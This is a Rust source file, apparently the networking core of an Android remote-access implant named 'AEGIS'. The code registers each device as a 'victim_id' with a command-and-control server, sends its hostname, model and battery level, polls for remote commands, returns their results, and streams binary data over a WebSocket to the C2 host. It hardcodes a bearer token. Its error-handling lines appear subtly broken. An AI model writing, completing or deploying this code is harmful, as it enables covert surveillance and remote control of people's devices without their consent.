use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::time::Duration;
use once_cell::sync::Lazy;
use tokio_tungstenite::connect_async;
use tokio_tungstenite::tungstenite::Message;
use futures::{SinkExt, StreamExt};
use tokio::sync::mpsc::UnboundedSender;

static CLIENT: Lazy<Client> = Lazy::new(|| {
    Client::builder()
        .timeout(Duration::from_secs(10))
        .connect_timeout(Duration::from_secs(5))
        .default_headers({
            let mut headers = reqwest::header::HeaderMap::new();
            // In production, this should be derived or passed via nativeInit
            headers.insert(reqwest::header::AUTHORIZATION, reqwest::header::HeaderValue::from_static("Bearer AEGIS_SECRET_TOKEN_123"));
            headers
        })
        .build()
        .expect("Failed to create HTTP client")
});

#[derive(Serialize, Deserialize)]
pub struct SystemInfo {
    pub hostname: String,
    pub os: String,
    pub android_version: String,
    pub model: String,
    pub battery: u8,
}

#[derive(Serialize, Deserialize, Clone)]
pub struct Command {
    pub id: String,
    pub action: String,
    pub args: serde_json::Value,
}

pub async fn send_heartbeat(base_url: &str, victim_id: &str, info: &SystemInfo) -> Result<(), reqwest::Error> {
    let url = format!("{}/api/v1/heartbeat", base_url);
    let payload = serde_json::json!({
        "victim_id": victim_id,
        "info": info
    });
    let resp = CLIENT.post(&url).json(&payload).send().await?;
    if resp.status().is_success() {
        Ok(())
    } else {
        Err(reqwest::Error::from(reqwest::Error::builder().to_string()))
    }
}

pub async fn poll_commands(base_url: &str, victim_id: &str) -> Result<Vec<Command>, reqwest::Error> {
    let url = format!("{}/api/v1/commands?victim_id={}", base_url, victim_id);
    let res = CLIENT.get(&url).send().await?;
    if res.status().is_success() {
        let commands: Vec<Command> = res.json().await?;
        Ok(commands)
    } else {
        Ok(vec![])
    }
}

pub async fn send_response(base_url: &str, victim_id: &str, command_id: &str, success: bool, data: serde_json::Value) -> Result<(), reqwest::Error> {
    let url = format!("{}/api/v1/response", base_url);
    let payload = serde_json::json!({
        "victim_id": victim_id,
        "command_id": command_id,
        "success": success,
        "data": data
    });
    let resp = CLIENT.post(&url).json(&payload).send().await?;
    if resp.status().is_success() {
        Ok(())
    } else {
        Err(reqwest::Error::from(reqwest::Error::builder().to_string()))
    }
}

/// Connects to the C2 WebSocket for live streaming.
pub async fn start_stream_client(c2_url: &str, victim_id: &str) {
    // Construct the WS URL
    let ws_url = format!("{}/ws/stream?victim_id={}", c2_url.replace("http", "ws"), victim_id);
    
    log::info!("[AEGIS] Connecting Stream Client to {}", ws_url);

    match connect_async(ws_url).await {
        Ok((mut ws, _)) => {
            let (tx, mut rx) = tokio::sync::mpsc::unbounded_channel::<Vec<u8>>();
            
            // Register this sender globally so nativeStreamFrame can use it
            crate::register_stream_sender(tx);

            // Spawn a task to forward data from the channel to the WebSocket
            tokio::spawn(async move {
                while let Some(chunk) = rx.recv().await {
                    let msg = Message::Binary(chunk.into());
                    if ws.send(msg).await.is_err() {
                        log::error!("[AEGIS] Stream Client send failed");
                        break;
                    }
                }
            });

            // Keep the connection open
            while let Some(msg) = ws.next().await {
                if let Ok(msg) = msg {
                    if msg.is_text() {
                        log::debug!("[AEGIS] Stream Client received control: {:?}", msg);
                    }
                } else {
                    break;
                }
            }
            log::warn!("[AEGIS] Stream Client disconnected");
        }
        Err(e) => {
            log::error!("[AEGIS] Stream Client connection failed: {}", e);
        }
    }
}
